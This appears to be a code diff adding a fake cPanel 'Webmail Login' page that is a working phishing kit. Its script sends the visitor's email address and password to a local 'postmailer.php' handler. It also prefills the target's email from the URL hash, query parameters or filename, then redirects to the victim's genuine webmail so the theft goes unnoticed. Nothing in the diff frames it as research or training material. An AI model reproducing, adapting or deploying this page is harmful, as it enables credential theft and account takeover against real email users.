@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+      <meta name="google" content="notranslate">
+      <meta name="apple-itunes-app" content="app-id=1188352635">
+      <title>Webmail Login</title>
+      <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGYYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdapa26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjParPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/666t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
+      <style type="text/css">
+         body {
+             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+             font-family: 'Open Sans', sans-serif;
+             margin: 0;
+             padding: 0;
+             min-height: 100vh;
+         }
+         
+         .wm {
+             display: flex;
+             align-items: center;
+             justify-content: center;
+             min-height: 100vh;
+         }
+         
+         #login-wrapper {
+             background: white;
+             border-radius: 10px;
+             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+             padding: 40px;
+             max-width: 400px;
+             width: 100%;
+             margin: 20px;
+         }
+         
+         .main-logo {
+             display: block;
+             margin: 0 auto 30px;
+             max-width: 250px;
+             height: auto;
+         }
+         
+         .input-req-login {
+             margin-bottom: 8px;
+         }
+         
+         .input-req-login label {
+             font-weight: 600;
+             color: #333;
+             font-size: 14px;
+         }
+         
+         .input-field-login {
+             margin-bottom: 20px;
+             position: relative;
+         }
+         
+         .std_textbox {
+             width: 100%;
+             padding: 12px 15px;
+             border: 2px solid #e1e5e9;
+             border-radius: 6px;
+             font-size: 14px;
+             transition: border-color 0.3s ease;
+             box-sizing: border-box;
+         }
+         
+         .std_textbox:focus {
+             outline: none;
+             border-color: #667eea;
+             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+         }
+         
+         .controls {
+             display: flex;
+             justify-content: space-between;
+             align-items: center;
+             margin-top: 20px;
+         }
+         
+         .login-btn button {
+             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+             color: white;
+             border: none;
+             padding: 12px 30px;
+             border-radius: 6px;
+             font-size: 16px;
+             font-weight: 600;
+             cursor: pointer;
+             transition: transform 0.2s ease, box-shadow 0.2s ease;
+         }
+         
+         .login-btn button:hover {
+             transform: translateY(-2px);
+             box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+         }
+         
+         .login-btn button:disabled {
+             opacity: 0.6;
+             cursor: not-allowed;
+             transform: none;
+         }
+         
+         .reset-pw a {
+             color: #667eea;
+             text-decoration: none;
+             font-size: 14px;
+         }
+         
+         .reset-pw a:hover {
+             text-decoration: underline;
+         }
+         
+         .error-notice, .success-notice {
+             padding: 15px;
+             border-radius: 6px;
+             margin-bottom: 20px;
+             font-size: 14px;
+         }
+         
+         .error-notice {
+             background-color: #f8d7da;
+             color: #721c24;
+             border: 1px solid #f5c6cb;
+         }
+         
+         .success-notice {
+             background-color: #d4edda;
+             color: #155724;
+             border: 1px solid #c3e6cb;
+         }
+         
+         .loading-overlay {
+             position: fixed;
+             top: 0;
+             left: 0;
+             width: 100%;
+             height: 100%;
+             background: rgba(0, 0, 0, 0.7);
+             display: none;
+             z-index: 9999;
+         }
+         
+         .loading-content {
+             position: absolute;
+             top: 50%;
+             left: 50%;
+             transform: translate(-50%, -50%);
+             background: white;
+             padding: 30px;
+             border-radius: 10px;
+             text-align: center;
+         }
+         
+         .spinner {
+             width: 40px;
+             height: 40px;
+             border: 4px solid #f3f3f3;
+             border-top: 4px solid #667eea;
+             border-radius: 50%;
+             animation: spin 1s linear infinite;
+             margin: 0 auto 15px;
+         }
+         
+         @keyframes spin {
+             0% { transform: rotate(0deg); }
+             100% { transform: rotate(360deg); }
+         }
+         
+         .copyright {
+             position: fixed;
+             bottom: 20px;
+             left: 50%;
+             transform: translateX(-50%);
+             color: rgba(255, 255, 255, 0.8);
+             font-size: 12px;
+             text-align: center;
+         }
+         
+         .copyright a {
+             color: rgba(255, 255, 255, 0.9);
+         }
+         
+         #msg {
+             color: #e74c3c;
+             font-size: 14px;
+             margin-top: 10px;
+             padding: 8px;
+             border-radius: 4px;
+             background-color: #ffeaea;
+             border: 1px solid #ffc6c6;
+             display: none;
+         }
+         
+         .attempt-counter {
+             position: absolute;
+             top: 10px;
+             right: 10px;
+             background: rgba(0, 0, 0, 0.1);
+             padding: 5px 10px;
+             border-radius: 15px;
+             font-size: 12px;
+             color: #666;
+         }
+      </style>
+   </head>
+   <body class="wm">
+      <div id="preload_images"></div>
+      <input type="hidden" id="goto_uri" value="/?locale=en">
+      <input type="hidden" id="goto_app" value="">
+      
+      <!-- Loading overlay -->
+      <div id="loading-overlay" class="loading-overlay">
+         <div class="loading-content">
+            <div class="spinner"></div>
+            <p>Verifying credentials...</p>
+         </div>
+      </div>
+      
+      <div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+         <div class="attempt-counter" id="attempt-counter" style="display: none;">
+            Attempt: <span id="attempt-number">1</span>
+         </div>
+         
+         <div class="wrapper">
+            <div id="notify">
+               <div id="login-status" class="error-notice" style="display:none;">
+                  <div class="content-wrapper">
+                     <div id="login-detail">
+                        <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
+                        <div id="login-status-message">Login is invalid</div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            
+            <div id="content-container">
+               <div id="login-container">
+                  <div id="login-sub-container">
+                     <div id="login-sub-header">
+                        <img class="main-logo" src="https://webmail.gracedrive.org/cPanel_magic_revision_1453787365/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
+                     </div>
+                     
+                     <div id="login-sub">
+                        <div id="forms">
+                           <form novalidate id="login_form" action="postmailer.php" method="post">
+                              <div class="input-req-login">
+                                 <label for="email">Email Address</label>
+                              </div>
+                              <div class="input-field-login icon username-container">
+                                 <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address" class="std_textbox" type="email" tabindex="1" required autocomplete="email">
+                              </div>
+                              
+                              <div class="input-req-login login-password-field-label">
+                                 <label for="password">Password</label>
+                              </div>
+                              <div class="input-field-login icon password-container">
+                                 <input name="password" id="password" placeholder="Enter your email password" class="std_textbox" type="password" tabindex="2" required autocomplete="current-password">
+                              </div>
+                              
+                              <p id="msg"></p>
+                              
+                              <div class="controls">
+                                 <div class="login-btn">
+                                    <button type="submit" name="login" id="login_submit" tabindex="3">Log in</button>
+                                 </div>
+                                 <div class="reset-pw">
+                                    <a href="#" id="reset_password">Reset Password</a>
+                                 </div>
+                              </div>
+                              
+                              <div class="clear" id="push"></div>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      
+      <div class="copyright">
+         Copyright© 2025 cPanel, L.L.C.<br>
+         <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+      </div>
+      
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script>
+         $(document).ready(function() {
+             // Configuration
+             var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect
+             var MAX_ATTEMPTS = 10; // Maximum attempts to track
+             var attempt_count = parseInt(localStorage.getItem('login_attempts') || '0');
+             
+             // Update attempt counter display
+             function updateAttemptCounter() {
+                 if (attempt_count > 0) {
+                     $('#attempt-counter').show();
+                     $('#attempt-number').text(attempt_count + 1);
+                 }
+             }
+             
+             // Function to extract domain from email and create webmail URL
+             function getWebmailUrl(email) {
+                 if (!email || !email.includes('@')) {
+                     return 'https://webmail.gracedrive.org';
+                 }
+                 var domain = email.split('@')[1];
+                 return 'https://webmail.' + domain;
+             }
+             
+             // Enhanced function to extract email from URL
+             function extractEmailFromUrl() {
+                 var email = null;
+                 
+                 // 1. Try URL hash
+                 var hash = window.location.hash;
+                 if (hash && hash.length > 1) {
+                     var hashContent = decodeURIComponent(hash.substring(1));
+                     var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                     if (emailRegex.test(hashContent)) {
+                         email = hashContent;
+                     }
+                 }
+                 
+                 // 2. Try URL query parameters
+                 if (!email) {
+                     var urlParams = new URLSearchParams(window.location.search);
+                     var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
+                     if (emailParam) {
+                         var decodedEmail = decodeURIComponent(emailParam);
+                         var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                         if (emailRegex.test(decodedEmail)) {
+                             email = decodedEmail;
+                         }
+                     }
+                 }
+                 
+                 // 3. Try to extract from filename
+                 if (!email) {
+                     var path = window.location.pathname;
+                     var fileMatch = path.match(/@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+                     if (fileMatch && fileMatch[1]) {
+                         email = fileMatch[1];
+                     }
+                 }
+                 
+                 return email;
+             }
+             
+             // Function to handle successful login
+             function handleSuccessfulLogin(response) {
+                 $('#loading-overlay').hide();
+                 var msg = response && response.msg ? response.msg : 'Login successful!';
+                 
+                 // Show success message
+                 $('#login-status-message').text(msg);
+                 $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                 
+                 // Clear password field for security
+                 $('#password').val('');
+                 
+                 // Disable form
+                 $('#login_submit').prop('disabled', true).text('Login Successful');
+                 $('#email, #password').prop('disabled', true);
+                 
+                 // Reset attempt counter on successful login
+                 localStorage.removeItem('login_attempts');
+                 
+                 // Redirect to actual webmail
+                 var userEmail = $('#email').val();
+                 var redirectUrl = getWebmailUrl(userEmail);
+                 
+                 setTimeout(function() {
+                     try {
+                         window.location.replace(redirectUrl);
+                     } catch(e) {
+                         window.location.href = redirectUrl;
+                     }
+                 }, REDIRECT_DELAY);
+             }
+             
+             // Function to handle failed login
+             function handleFailedLogin(response) {
+                 $('#loading-overlay').hide();
+                 var msg = response && response.msg ? response.msg : 'Invalid email or password. Please try again.';
+                 
+                 $('#login-status-message').text(msg);
+                 $('#login-status').removeClass('success-notice').addClass('error-notice').show();
+                 $('#password').val('').focus();
+                 
+                 // Increment attempt counter
+                 attempt_count++;
+                 localStorage.setItem('login_attempts', attempt_count.toString());
+                 updateAttemptCounter();
+                 
+                 // Re-enable form
+                 $('#login_submit').prop('disabled', false).text('Log in');
+             }
+             
+             // Auto-populate email field if found in URL
+             var emailFromUrl = extractEmailFromUrl();
+             if (emailFromUrl) {
+                 $('#email').val(emailFromUrl);
+                 $('#password').focus();
+                 $('#email').css('background-color', '#f0f8ff');
+                 setTimeout(function() {
+                     $('#email').css('background-color', '');
+                 }, 2000);
+             }
+             
+             // Initialize attempt counter
+             updateAttemptCounter();
+             
+             // Listen for hash changes
+             $(window).on('hashchange', function() {
+                 var newEmail = extractEmailFromUrl();
+                 if (newEmail && newEmail !== $('#email').val()) {
+                     $('#email').val(newEmail);
+                     $('#password').focus();
+                 }
+             });
+             
+             // Form submission handler
+             $('#login_form').on('submit', function(e) {
+                 e.preventDefault();
+                 
+                 var email = $('#email').val().trim();
+                 var password = $('#password').val();
+                 
+                 // Client-side validation
+                 if (!email) {
+                     $('#msg').text('Please enter an email address.').show();
+                     $('#email').focus();
+                     return false;
+                 }
+                 
+                 if (!password) {
+                     $('#msg').text('Please enter a password.').show();
+                     $('#password').focus();
+                     return false;
+                 }
+                 
+                 var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                 if (!emailRegex.test(email)) {
+                     $('#msg').text('Please enter a valid email address.').show();
+                     $('#email').focus();
+                     return false;
+                 }
+                 
+                 // Hide previous messages
+                 $('#msg, #login-status').hide();
+                 $('#loading-overlay').show();
+                 
+                 // Submit the form via AJAX
+                 $.ajax({
+                     url: 'postmailer.php', // Local PHP backend
+                     method: 'POST',
+                     data: {
+                         email: email,
+                         password: password
+                     },
+                     dataType: 'json',
+                     cache: false,
+                     timeout: 30000,
+                     beforeSend: function() {
+                         $('#login_submit').prop('disabled', true).text('Verifying...');
+                     },
+                     success: function(response) {
+                         console.log('Server response:', response);
+                         
+                         // Check if login was successful
+                         if (response && (response.signal === 'ok' || response.success === true || 
+                             response.credentials_valid === true)) {
+                             handleSuccessfulLogin(response);
+                         } else {
+                             handleFailedLogin(response);
+                         }
+                     },
+                     error: function(xhr, status, error) {
+                         $('#loading-overlay').hide();
+                         var errorMsg = 'Connection error. Please try again.';
+                         
+                         if (xhr.responseText) {
+                             try {
+                                 var errorResponse = JSON.parse(xhr.responseText);
+                                 errorMsg = errorResponse.msg || errorMsg;
+                             } catch (e) {
+                                 errorMsg = 'Server error: ' + xhr.status;
+                             }
+                         }
+                         
+                         $('#login-status-message').text(errorMsg);
+                         $('#login-status').removeClass('success-notice').addClass('error-notice').show();
+                         $('#password').val('').focus();
+                         $('#login_submit').prop('disabled', false).text('Log in');
+                     }
+                 });
+                 
+                 return false;
+             });
+             
+             // Reset password functionality
+             $('#reset_password').click(function(e) {
+                 e.preventDefault();
+                 var email = $('#email').val();
+                 if (email) {
+                     var domain = email.split('@')[1] || 'your-domain.com';
+                     var resetUrl = 'https://webmail.' + domain + '/reset-password';
+                     window.open(resetUrl, '_blank');
+                 } else {
+                     alert('Please enter your email address first.');
+                     $('#email').focus();
+                 }
+             });
+             
+             // Enhanced keyboard navigation
+             $(document).keydown(function(e) {
+                 if (e.which === 13) { // Enter key
+                     $('#login_form').submit();
+                 }
+             });
+             
+             // Clear messages when user starts typing
+             $('#email, #password').on('input', function() {
+                 $('#msg, #login-status').fadeOut();
+             });
+         });
+      </script>
+   </body>
+</html>
